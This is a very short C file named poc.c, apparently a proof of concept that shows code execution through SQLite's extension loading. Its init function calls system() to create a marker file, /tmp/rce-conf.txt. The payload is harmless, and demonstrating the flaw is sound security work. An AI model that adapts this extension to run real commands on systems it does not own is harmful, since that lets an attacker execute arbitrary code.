/* poc.c */
#include <stdlib.h>

int sqlite3_extension_init(void) {
  system("touch /tmp/rce-conf.txt");
  return 0;
}
